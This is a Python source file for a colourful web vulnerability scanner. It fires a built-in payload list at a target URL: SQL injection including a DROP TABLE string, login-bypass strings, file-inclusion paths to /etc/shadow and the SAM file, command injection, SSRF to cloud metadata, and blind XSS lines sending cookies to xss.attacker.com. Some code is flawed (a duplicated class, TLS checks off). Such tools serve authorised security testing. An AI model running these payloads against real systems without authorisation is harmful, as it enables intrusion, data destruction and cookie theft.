"""
██╗    ██╗███████╗██████╗ ███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗██████╗ 
██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ██████╔╝███████║██████╔╝█████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝███████║╚██████╗██║  ██║██║  ██║██║     ███████╗██║  ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝

       USE ONLY ON SYSTEMS YOU OWN OR HAVE EXPLICIT PERMISSION TO TEST
"""

import requests
from requests.adapters import HTTPAdapter
from urllib.parse import urljoin, urlparse, parse_qs
from urllib3.util.retry import Retry
import re
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import json
from typing import List, Dict, Tuple, Optional
import sys
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib
import random
import base64
import html
from datetime import datetime
from termcolor import colored
import pyfiglet
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box

console = Console()
init(autoreset=True)

class MatrixEffect:
    """Terminal matrix rain effect for ultimate coolness"""
    @staticmethod
    def matrix_rain(duration=3):
        chars = ['0', '1', ' ', '░', '▒', '▓', '█']
        columns = os.get_terminal_size().columns
        
        
        sys.stdout.write('\033[s')
        
        end_time = time.time() + duration
        frames = []
        
        
        for frame in range(int(duration * 15)):
            frame_data = []
            for col in range(min(columns, 80)):
                if random.random() < 0.15:
                    char = random.choice(chars)
                    color = random.choice([Fore.GREEN, Fore.CYAN, Fore.WHITE])
                    frame_data.append(f"{color}{char}{Style.RESET_ALL}")
                else:
                    frame_data.append(' ')
            frames.append(''.join(frame_data))
        
        
        start_time = time.time()
        frame_idx = 0
        while time.time() - start_time < duration:
            sys.stdout.write('\033[u')  # Restore cursor
            sys.stdout.write('\033[K')  # Clear line
            print(frames[frame_idx % len(frames)], end='')
            sys.stdout.flush()
            frame_idx += 1
            time.sleep(0.033)  
        
        sys.stdout.write('\033[u')  
        sys.stdout.write('\033[K')  
        sys.stdout.flush()

class HackerAnimation:
    """Next-level terminal animations"""
    @staticmethod
    def print_glitch_text(text, delay=0.01):
        """Print text with glitch effect"""
        glitch_chars = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+']
        for char in text:
            if random.random() < 0.05:
                sys.stdout.write(random.choice(glitch_chars))
            else:
                sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def loading_bar_with_glitch(message, duration=2):
        """Sick loading bar with glitch effects"""
        width = 60
        for i in range(width + 1):
            percent = int((i / width) * 100)
            bar = '█' * i + '░' * (width - i)
            
            # Random glitch effects
            if random.random() < 0.03:
                sys.stdout.write(f'\r{Fore.RED}[GLITCH]{Style.RESET_ALL}')
                time.sleep(0.05)
            
            sys.stdout.write(f'\r{Fore.CYAN}[{Fore.GREEN}{bar}{Fore.CYAN}] {percent}% {message}{Style.RESET_ALL}')
            sys.stdout.flush()
            time.sleep(duration / width)
        print()
class HackerAnimation:
    @staticmethod
    def print_hacker_banner():
        banner_text = r"""
██╗    ██╗███████╗██████╗ ███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗██████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ██████╔╝███████║██████╔╝█████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝███████║╚██████╗██║  ██║██║  ██║██║     ███████╗██║  ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
"""
        print(f"{Fore.RED}{banner_text}{Style.RESET_ALL}")
     
print(f"{Fore.RED}╔════════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
print(f"{Fore.RED}║                           WEBSCRAPER                           ║{Style.RESET_ALL}")
print(f"{Fore.RED}╚════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

class AdvancedScanner:
    """Next-gen web vulnerability scanner with AI-like detection"""
    
    def __init__(self, target_url: str, threads: int = 10, timeout: int = 10):
        self.target_url = target_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.session = self._create_session()
        self.vulnerabilities = []
        self.vulnerability_groups = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': []
        }
        self.scan_timestamp = datetime.now().isoformat()
        self.scan_id = hashlib.md5(target_url.encode()).hexdigest()[:8]
        
        
        self.payloads = self._load_payloads()
        
    def _create_session(self) -> requests.Session:
        """Create a badass session with advanced features"""
        session = requests.Session()
        
        
        retry_strategy = Retry(
            total=3,
            backoff_factor=2,
            status_forcelist=[429, 500, 502, 503, 504],
            raise_on_redirect=False,
            raise_on_status=False
        )
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=100,
            pool_maxsize=100
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })
        
        return session
    
    def _load_payloads(self) -> Dict:
        """Load comprehensive payload database"""
        return {
            'sqli': {
                'error_based': [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' UNION SELECT NULL--",
                    "' AND 1=CONVERT(int, @@version)--",
                    "' OR '1'='1' /*",
                    "' OR 1=1 #",
                    "' OR 1=1-- -",
                    "'; DROP TABLE users--",
                    "' OR 'a'='a",
                    "') OR ('1'='1",
                    "' OR 1=1 AND '1'='1",
                    "admin'--",
                    "admin' #",
                    "admin'/*",
                ],
                'time_based': [
                    "' AND SLEEP(5)--",
                    "' OR SLEEP(5)--",
                    "'; WAITFOR DELAY '0:0:5'--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "' OR IF(1=1, SLEEP(5), 0)--",
                ],
                'union_based': [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT @@version,user(),database()--",
                ],
                'boolean_based': [
                    "' AND '1'='1",
                    "' AND '1'='2",
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "') AND ('1'='1",
                    "') AND ('1'='2",
                ]
            },
            'xss': {
                'reflected': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "javascript:alert(1)",
                    "'><script>alert(1)</script>",
                    "\"><script>alert(1)</script>",
                    "';alert(1);//",
                    "\"><img src=x onerror=alert(1)>",
                    "<iframe src=\"javascript:alert(1)\">",
                    "<input type=\"text\" value=\"\" onfocus=alert(1) autofocus>",
                ],
                'dom_based': [
                    "javascript:alert(document.domain)",
                    "javascript:alert(window.location.href)",
                    "' onerror=alert(1)>",
                    "#<script>alert(1)</script>",
                    "?<script>alert(1)</script>",
                    "';document.write('XSS');//",
                ],
                'blind': [
                    "<script>fetch('http://xss.attacker.com/steal?c='+document.cookie)</script>",
                    "<script>new Image().src='http://xss.attacker.com/log?'+document.cookie</script>",
                    "<svg/onload=window.location='http://xss.attacker.com/'+document.cookie>",
                ]
            },
            'lfi': {
                'linux': [
                    "../../../../etc/passwd",
                    "../../../../etc/shadow",
                    "../../../../etc/hosts",
                    "../../../../etc/apache2/apache2.conf",
                    "../../../../proc/self/environ",
                    "../../../../var/log/auth.log",
                ],
                'windows': [
                    "..\\..\\..\\..\\Windows\\win.ini",
                    "..\\..\\..\\..\\Windows\\system32\\drivers\\etc\\hosts",
                    "..\\..\\..\\..\\Windows\\System32\\config\\SAM",
                ]
            },
            'command_injection': [
                "; ls",
                "; pwd",
                "; whoami",
                "; id",
                "; cat /etc/passwd",
                "| ls",
                "| pwd",
                "|| ls",
                "& ls",
                "&& ls",
                "`id`",
                "$(id)",
                "%0Aid",
            ],
            'ssrf': [
                "http://localhost",
                "http://127.0.0.1",
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://metadata.google.internal/",
                "http://[::1]",
                "http://127.0.0.1:8080",
                "file:///etc/passwd",
                "gopher://localhost:8080/_GET / HTTP/1.0%0A%0A",
            ],
            'path_traversal': [
                "../",
                "..\\",
                "../../",
                "%2e%2e%2f",
                "%252e%252e%252f",
                "..%252f",
                "..%c0%af",
                "..%c1%9c",
            ]
        }
    
    def fetch_page(self) -> bool:
        """Fetch target with advanced techniques"""
        try:
            with console.status("[bold cyan]Establishing connection...", spinner="dots"):
                response = self.session.get(
                    self.target_url, 
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False
                )
                response.raise_for_status()
            
            self.page_content = response.text
            self.page_soup = BeautifulSoup(response.text, 'html.parser')
            
            self.page_info = {
                'status_code': response.status_code,
                'content_type': response.headers.get('Content-Type', 'Unknown'),
                'server': response.headers.get('Server', 'Unknown'),
                'title': self.page_soup.title.string if self.page_soup.title else 'No title',
                'content_length': len(response.text),
                'headers': dict(response.headers),
                'cookies': response.cookies.get_dict(),
                'response_time': response.elapsed.total_seconds(),
                'final_url': response.url,
                'redirect_count': len(response.history),
            }
            
            return True
            
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Connection failed: {e}[/red]")
            return False
    
    def advanced_sql_injection_test(self) -> None:
        """Advanced SQL injection testing with multiple techniques"""
        console.print("\n[yellow]⚡[bold] ADVANCED SQL INJECTION TESTING[/bold][/yellow]")
        
        forms = self.find_forms()
        urls_with_params = self.extract_url_parameters()
        
        test_targets = []
        
        
        for form in forms:
            form_url = urljoin(self.target_url, form['action']) if form['action'] else self.target_url
            test_targets.append({
                'url': form_url,
                'method': form['method'],
                'fields': form['fields'],
                'type': 'form'
            })
        
        # Add URL parameter targets
        for url_data in urls_with_params:
            test_targets.append({
                'url': url_data['url'],
                'method': 'GET',
                'fields': [{'name': param, 'type': 'text'} for param in url_data['params']],
                'type': 'url'
            })
        
        if not test_targets:
            console.print("[dim]No forms or URL parameters found to test.[/dim]")
            return
        
        total_targets = len(test_targets)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            
            task = progress.add_task("[cyan]SQLi Testing...", total=total_targets)
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_target = {
                    executor.submit(self._test_single_sqli, target): target 
                    for target in test_targets
                }
                
                for future in as_completed(future_to_target):
                    target = future_to_target[future]
                    try:
                        result = future.result()
                        if result:
                            self.vulnerabilities.extend(result)
                    except Exception as e:
                        console.print(f"[red]Error in SQLi test: {e}[/red]")
                    
                    progress.update(task, advance=1)
    
    def _test_single_sqli(self, target: Dict) -> List[Dict]:
        """Test a single target for SQL injection"""
        findings = []
        base_data = {}
        url = target['url']
        method = target['method']
        fields = target['fields']
        
        
        for field in fields:
            base_data[field['name']] = 'test_value'
        
      
        for category, payloads in self.payloads['sqli'].items():
            for payload in payloads[:3]: 
                test_data = base_data.copy()
                for field in fields:
                    if field['type'] in ['text', 'search', 'email', 'number']:
                        test_data[field['name']] = payload
                        break
                
                try:
                    if method == 'POST':
                        response = self.session.post(url, data=test_data, timeout=self.timeout)
                    else:
                        response = self.session.get(url, params=test_data, timeout=self.timeout)
                    
                    
                    if self._detect_sqli_response(response.text):
                        findings.append({
                            'type': 'SQL Injection',
                            'subtype': category,
                            'severity': 'Critical',
                            'url': url,
                            'method': method,
                            'payload': payload,
                            'field': field['name'],
                            'description': f'Potential {category} SQL injection detected',
                            'evidence': self._extract_sqli_evidence(response.text)
                        })
                        break  
                        
                except Exception as e:
                    continue
        
        return findings
    
    def _detect_sqli_response(self, text: str) -> bool:
        """Detect SQL injection from response patterns"""
        patterns = [
            r"mysql_fetch_array",
            r"mysql_error",
            r"mysqli_error",
            r"SQL syntax",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB",
            r"Driver.*SQL Server",
            r"PostgreSQL.*ERROR",
            r"ORA-[0-9]{5}",
            r"SQLite.*error",
            r"SQLSTATE",
            r"ODBC.*SQL Server",
            r"org\.hibernate\.engine",
            r"java\.sql\.SQLException",
            r"PDOException",
            r"Database error",
            r"mysql_connect",
            r"Warning: mysql_",
            r"Fatal error:.* on line",
            r"Column.*not found",
            r"Table.*doesn't exist",
            r"Unknown column",
            r"You have an error in your SQL syntax",
        ]
        
        text_lower = text.lower()
        for pattern in patterns:
            if re.search(pattern, text_lower, re.IGNORECASE):
                return True
        return False
    
    def _extract_sqli_evidence(self, text: str) -> str:
        """Extract SQL error evidence from response"""
        error_patterns = [
            r"(SQL syntax.*?)[\n\r]",
            r"(mysql.*?error.*?)[\n\r]",
            r"(database.*?error.*?)[\n\r]",
            r"(ORA-[0-9]{5}.*?)[\n\r]",
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()[:200]
        return "SQL error pattern detected"
    
    def advanced_xss_test(self) -> None:
        """Advanced XSS testing with context-aware payloads"""
        console.print("\n[yellow]⚡[bold] ADVANCED XSS TESTING[/bold][/yellow]")
        
        forms = self.find_forms()
        urls_with_params = self.extract_url_parameters()
        
        test_targets = []
        
        for form in forms:
            form_url = urljoin(self.target_url, form['action']) if form['action'] else self.target_url
            test_targets.append({
                'url': form_url,
                'method': form['method'],
                'fields': form['fields'],
                'type': 'form',
                'context': self._detect_context(form)
            })
        
        for url_data in urls_with_params:
            test_targets.append({
                'url': url_data['url'],
                'method': 'GET',
                'fields': [{'name': param, 'type': 'text'} for param in url_data['params']],
                'type': 'url',
                'context': 'html'
            })
        
        if not test_targets:
            console.print("[dim]No XSS injection points found.[/dim]")
            return
        
        total_targets = len(test_targets)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            
            task = progress.add_task("[cyan]XSS Testing...", total=total_targets)
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_target = {
                    executor.submit(self._test_single_xss, target): target
                    for target in test_targets
                }
                
                for future in as_completed(future_to_target):
                    target = future_to_target[future]
                    try:
                        result = future.result()
                        if result:
                            self.vulnerabilities.extend(result)
                    except Exception as e:
                        console.print(f"[red]Error in XSS test: {e}[/red]")
                    
                    progress.update(task, advance=1)
    
    def _test_single_xss(self, target: Dict) -> List[Dict]:
        """Test a single target for XSS vulnerabilities"""
        findings = []
        url = target['url']
        method = target['method']
        fields = target['fields']
        context = target.get('context', 'html')
        
        
        all_payloads = []
        all_payloads.extend(self.payloads['xss']['reflected'])
        all_payloads.extend(self.payloads['xss']['dom_based'])
        
        if context in ['html', 'attribute']:
            all_payloads.extend(self.payloads['xss']['blind'])
        
        for payload in all_payloads[:5]:  
            test_data = {}
            for field in fields:
                if field['type'] in ['text', 'search', 'email', 'url', 'number']:
                    test_data[field['name']] = payload
                else:
                    test_data[field['name']] = 'test'
            
            try:
                if method == 'POST':
                    response = self.session.post(url, data=test_data, timeout=self.timeout)
                else:
                    response = self.session.get(url, params=test_data, timeout=self.timeout)
                
                
                if payload in response.text:
                    findings.append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'High',
                        'url': url,
                        'method': method,
                        'payload': payload[:50],
                        'field': field['name'],
                        'description': f'Payload reflected in response (context: {context})',
                        'evidence': f'Payload "{payload[:50]}" found in response'
                    })
                    break  
                    
            except Exception as e:
                continue
        
        return findings
    
    def _detect_context(self, form: Dict) -> str:
        """Detect context of form fields"""
        context = 'html'
        
        
        for field in form['fields']:
            if 'value' in field:
                if '<' in field['value'] or '>' in field['value']:
                    context = 'html'
                    break
            if field.get('type') in ['hidden', 'password']:
                context = 'attribute'
                break
        
        return context
    
    def find_forms(self) -> List[Dict]:
        """Extract all forms with enhanced field detection"""
        forms = []
        for form in self.page_soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'fields': [],
                'enctype': form.get('enctype', 'application/x-www-form-urlencoded')
            }
            
           
            for input_elem in form.find_all(['input', 'textarea', 'select']):
                field_data = {
                    'name': input_elem.get('name', ''),
                    'type': input_elem.get('type', 'text'),
                    'value': input_elem.get('value', ''),
                    'required': input_elem.get('required') is not None
                }
                
                
                if input_elem.name == 'select':
                    options = []
                    for option in input_elem.find_all('option'):
                        options.append({
                            'value': option.get('value', ''),
                            'text': option.text.strip()
                        })
                    field_data['options'] = options
                
                form_data['fields'].append(field_data)
            
            forms.append(form_data)
        
        return forms
    
    def extract_url_parameters(self) -> List[Dict]:
        """Extract parameters from URL"""
        parsed = urlparse(self.target_url)
        if parsed.query:
            params = parse_qs(parsed.query)
            return [{
                'url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                'params': list(params.keys())
            }]
        return []
    
    def test_lfi_rfi(self) -> None:
        """Test for Local/Remote File Inclusion"""
        console.print("\n[yellow]⚡[bold] LFI/RFI TESTING[/bold][/yellow]")
        
        urls_with_params = self.extract_url_parameters()
        if not urls_with_params:
            console.print("[dim]No parameters found for LFI/RFI testing.[/dim]")
            return
        
        test_payloads = self.payloads['lfi']['linux'] + self.payloads['lfi']['windows']
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            console=console
        ) as progress:
            
            task = progress.add_task("[cyan]LFI/RFI Testing...", total=len(urls_with_params) * len(test_payloads))
            
            for url_data in urls_with_params:
                for param in url_data['params']:
                    for payload in test_payloads:
                        test_url = f"{url_data['url']}?{param}={payload}"
                        try:
                            response = self.session.get(test_url, timeout=self.timeout)
                            
                            
                            if any(indicator in response.text for indicator in ['root:x:', 'Microsoft Windows', 'log_directory', '[extensions]']):
                                self.vulnerabilities.append({
                                    'type': 'Local File Inclusion (LFI)',
                                    'severity': 'High',
                                    'url': test_url,
                                    'payload': payload,
                                    'description': 'Potential LFI vulnerability detected',
                                    'evidence': 'System file contents detected in response'
                                })
                                break
                        except Exception:
                            pass
                        
                        progress.update(task, advance=1)
    
    def test_command_injection(self) -> None:
        """Test for Command Injection vulnerabilities"""
        console.print("\n[yellow]⚡[bold] COMMAND INJECTION TESTING[/bold][/yellow]")
        
        forms = self.find_forms()
        
        if not forms:
            console.print("[dim]No forms found for command injection testing.[/dim]")
            return
        
        for form in forms:
            form_url = urljoin(self.target_url, form['action']) if form['action'] else self.target_url
            method = form['method']
            
            for payload in self.payloads['command_injection'][:5]:
                test_data = {}
                for field in form['fields']:
                    if field['type'] in ['text', 'search']:
                        test_data[field['name']] = payload
                    else:
                        test_data[field['name']] = 'test'
                
                try:
                    if method == 'POST':
                        response = self.session.post(form_url, data=test_data, timeout=self.timeout)
                    else:
                        response = self.session.get(form_url, params=test_data, timeout=self.timeout)
                    
                    
                    command_outputs = ['uid=', 'gid=', 'groups=', 'root', 'www-data', 'Administrator', 'User']
                    if any(output in response.text for output in command_outputs):
                        self.vulnerabilities.append({
                            'type': 'Command Injection',
                            'severity': 'Critical',
                            'url': form_url,
                            'payload': payload,
                            'description': 'Potential command injection vulnerability detected',
                            'evidence': 'Command output detected in response'
                        })
                        break
                except Exception:
                    pass
    
    def test_ssrf(self) -> None:
        """Test for Server-Side Request Forgery"""
        console.print("\n[yellow]⚡[bold] SSRF TESTING[/bold][/yellow]")
        
        forms = self.find_forms()
        
        if not forms:
            console.print("[dim]No forms found for SSRF testing.[/dim]")
            return
        
        for payload in self.payloads['ssrf'][:5]:
            for form in forms:
                form_url = urljoin(self.target_url, form['action']) if form['action'] else self.target_url
                test_data = {}
                
                for field in form['fields']:
                    if field['type'] in ['text', 'url', 'search']:
                        test_data[field['name']] = payload
                    else:
                        test_data[field['name']] = 'test'
                
                try:
                    response = self.session.post(form_url, data=test_data, timeout=self.timeout)
                    
                   
                    ssrf_indicators = ['169.254.169.254', 'metadata.google.internal', 'localhost']
                    if any(indicator in response.text for indicator in ssrf_indicators):
                        self.vulnerabilities.append({
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'Critical',
                            'url': form_url,
                            'payload': payload,
                            'description': 'Potential SSRF vulnerability detected',
                            'evidence': 'Internal resource metadata detected in response'
                        })
                        break
                except Exception:
                    pass
    
    def test_headers_security(self) -> None:
        """Comprehensive header security analysis"""
        console.print("\n[yellow]⚡[bold] SECURITY HEADER ANALYSIS[/bold][/yellow]")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            headers = response.headers
            
            security_checks = {
                'Content-Security-Policy': {
                    'required': True,
                    'severity': 'High',
                    'description': 'Protects against XSS and data injection attacks'
                },
                'X-Content-Type-Options': {
                    'required': True,
                    'severity': 'Medium',
                    'description': 'Prevents MIME type sniffing'
                },
                'X-Frame-Options': {
                    'required': True,
                    'severity': 'Medium',
                    'description': 'Prevents clickjacking attacks'
                },
                'Strict-Transport-Security': {
                    'required': self.target_url.startswith('https://'),
                    'severity': 'High',
                    'description': 'Enforces HTTPS connections'
                },
                'X-XSS-Protection': {
                    'required': False,
                    'severity': 'Medium',
                    'description': 'Legacy XSS protection (modern browsers ignore)'
                },
                'Referrer-Policy': {
                    'required': False,
                    'severity': 'Low',
                    'description': 'Controls referrer information leakage'
                },
                'Permissions-Policy': {
                    'required': False,
                    'severity': 'Low',
                    'description': 'Controls browser features access'
                },
                'Cross-Origin-Resource-Policy': {
                    'required': False,
                    'severity': 'Medium',
                    'description': 'Controls cross-origin resource sharing'
                },
                'Cross-Origin-Opener-Policy': {
                    'required': False,
                    'severity': 'Medium',
                    'description': 'Controls cross-origin window sharing'
                },
                'Cross-Origin-Embedder-Policy': {
                    'required': False,
                    'severity': 'Medium',
                    'description': 'Controls cross-origin embedding'
                }
            }
            
            for header, config in security_checks.items():
                if config['required'] and header not in headers:
                    self.vulnerabilities.append({
                        'type': f'Missing Security Header: {header}',
                        'severity': config['severity'],
                        'description': f'Missing {header}: {config["description"]}',
                        'evidence': f'Header {header} not found in response'
                    })
                    console.print(f"[red]⚠ Missing {header}: {config['description']}[/red]")
                elif header in headers:
                    value = headers[header][:100]
                    console.print(f"[green]✓ {header}: {value}[/green]")
                else:
                    console.print(f"[dim]○ {header}: Not required[/dim]")
                    
            
            self._analyze_cors(headers)
            self._analyze_cache(headers)
            self._analyze_cookies(response.cookies)
            
        except Exception as e:
            console.print(f"[red]Error analyzing headers: {e}[/red]")
    
    def _analyze_cors(self, headers: Dict) -> None:
        """Analyze CORS configuration"""
        if 'Access-Control-Allow-Origin' in headers:
            origin = headers['Access-Control-Allow-Origin']
            if origin == '*':
                self.vulnerabilities.append({
                    'type': 'CORS Misconfiguration',
                    'severity': 'Medium',
                    'description': 'Access-Control-Allow-Origin set to * - allows any domain to access resources',
                    'evidence': 'CORS policy allows all origins'
                })
                console.print("[red]⚠ CORS misconfiguration: Allow-Origin: *[/red]")
            else:
                console.print(f"[green]✓ CORS configured: {origin}[/green]")
    
    def _analyze_cache(self, headers: Dict) -> None:
        """Analyze cache headers"""
        cache_control = headers.get('Cache-Control', '')
        if 'no-cache' not in cache_control and 'no-store' not in cache_control:
            self.vulnerabilities.append({
                'type': 'Missing Cache Controls',
                'severity': 'Low',
                'description': 'Sensitive data might be cached by browsers',
                'evidence': 'Cache-Control header missing no-cache/no-store directives'
            })
            console.print("[yellow]⚠ Cache controls not properly configured[/yellow]")
    
    def _analyze_cookies(self, cookies) -> None:
        """Analyze cookie security"""
        for cookie in cookies:
            if not cookie.get('secure'):
                self.vulnerabilities.append({
                    'type': 'Insecure Cookie',
                    'severity': 'Medium',
                    'description': f'Cookie {cookie.get("name")} missing Secure flag - can be transmitted over HTTP',
                    'evidence': f'Cookie {cookie.get("name")} lacks Secure flag'
                })
                console.print(f"[red]⚠ Cookie {cookie.get('name')} missing Secure flag[/red]")
            
            if not cookie.get('httponly'):
                self.vulnerabilities.append({
                    'type': 'Insecure Cookie',
                    'severity': 'Medium',
                    'description': f'Cookie {cookie.get("name")} missing HttpOnly flag - accessible via JavaScript',
                    'evidence': f'Cookie {cookie.get("name")} lacks HttpOnly flag'
                })
                console.print(f"[red]⚠ Cookie {cookie.get('name')} missing HttpOnly flag[/red]")
            
            if not cookie.get('samesite'):
                self.vulnerabilities.append({
                    'type': 'Missing SameSite Cookie',
                    'severity': 'Low',
                    'description': f'Cookie {cookie.get("name")} missing SameSite attribute - vulnerable to CSRF',
                    'evidence': f'Cookie {cookie.get("name")} lacks SameSite attribute'
                })
                console.print(f"[yellow]⚠ Cookie {cookie.get('name')} missing SameSite attribute[/yellow]")
    
    def test_authentication_bypass(self) -> None:
        """Test for authentication bypass techniques"""
        console.print("\n[yellow]⚡[bold] AUTHENTICATION BYPASS TESTING[/bold][/yellow]")
        
        bypass_payloads = [
            ('admin\' OR 1=1--', 'admin'),
            ('admin\' OR \'1\'=\'1', 'admin'),
            ('admin\'--', 'admin'),
            ('\' OR 1=1--', ''),
            ('\' OR \'x\'=\'x', ''),
            ('admin\' OR 1=1', 'admin'),
            ('admin\' AND 1=1--', 'admin'),
            ('test\' OR 1=1--', 'test'),
            ('\' OR 1=1 #', ''),
            ('admin\' #', 'admin'),
        ]
        
        forms = self.find_forms()
        login_forms = [f for f in forms if any(field.get('type') == 'password' for field in f['fields'])]
        
        if not login_forms:
            console.print("[dim]No login forms detected.[/dim]")
            return
        
        for form in login_forms:
            form_url = urljoin(self.target_url, form['action']) if form['action'] else self.target_url
            method = form['method']
            
            username_field = None
            password_field = None
            for field in form['fields']:
                if field['type'] == 'password':
                    password_field = field['name']
                elif field['type'] == 'text' or field['type'] == 'email':
                    username_field = field['name']
            
            if username_field and password_field:
                for payload, username in bypass_payloads:
                    test_data = {
                        username_field: username,
                        password_field: payload
                    }
                    
                    try:
                        if method == 'POST':
                            response = self.session.post(form_url, data=test_data, timeout=self.timeout)
                        else:
                            response = self.session.get(form_url, params=test_data, timeout=self.timeout)
                        
                        
                        auth_indicators = ['dashboard', 'profile', 'logout', 'welcome', 'admin', 'account']
                        if any(indicator in response.url.lower() or indicator in response.text.lower() 
                               for indicator in auth_indicators):
                            self.vulnerabilities.append({
                                'type': 'Authentication Bypass',
                                'severity': 'Critical',
                                'url': form_url,
                                'payload': f'Username: {username}, Password: {payload}',
                                'description': 'Authentication bypass possible using SQL injection',
                                'evidence': f'Access granted with payload: {payload}'
                            })
                            console.print(f"[red]⚠ Authentication bypass possible: {payload}[/red]")
                            break
                    except Exception:
                        pass
    
    def run_full_scan(self) -> bool:
        """Run the complete advanced scan"""
        console.print("[bold cyan]╔══════════════════════════════════════════╗[/bold cyan]")
        console.print("[bold cyan]║    INITIATING ADVANCED SECURITY SCAN     ║[/bold cyan]")
        console.print("[bold cyan]╚══════════════════════════════════════════╝[/bold cyan]")
        
        MatrixEffect.matrix_rain(2)
        
        if not self.fetch_page():
            return False
        
        
        self.test_headers_security()
        self.advanced_sql_injection_test()
        self.advanced_xss_test()
        self.test_lfi_rfi()
        self.test_command_injection()
        self.test_ssrf()
        self.test_authentication_bypass()
        
        self.generate_report()
        return True
    
    def generate_report(self) -> Dict:
        """Generate comprehensive scan report"""
        
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'Low').lower()
            if severity not in self.vulnerability_groups:
                self.vulnerability_groups[severity] = []
            self.vulnerability_groups[severity].append(vuln)
        
        report = {
            'scan_id': self.scan_id,
            'target': self.target_url,
            'timestamp': self.scan_timestamp,
            'page_info': self.page_info,
            'vulnerabilities': self.vulnerabilities,
            'vulnerability_count': len(self.vulnerabilities),
            'severity_breakdown': {
                'critical': len(self.vulnerability_groups.get('critical', [])),
                'high': len(self.vulnerability_groups.get('high', [])),
                'medium': len(self.vulnerability_groups.get('medium', [])),
                'low': len(self.vulnerability_groups.get('low', []))
            },
            'total_vulnerabilities': len(self.vulnerabilities)
        }
        
        return report
    
    def print_report(self) -> None:
        """Print a beautiful report using Rich"""
        report = self.generate_report()
        
        console.print("[bold cyan]╔══════════════════════════════════════════════════════════════════╗[/bold cyan]")
        console.print("[bold cyan]║                    VULNERABILITY SCAN REPORT                     ║[/bold cyan]")
        console.print("[bold cyan]╚══════════════════════════════════════════════════════════════════╝[/bold cyan]")
        
        console.print(f"[cyan]Scan ID:[/cyan] {report['scan_id']}")
        console.print(f"[cyan]Target:[/cyan] {report['target']}")
        console.print(f"[cyan]Timestamp:[/cyan] {report['timestamp']}")
        console.print(f"[cyan]Status:[/cyan] {report['page_info'].get('status_code')}")
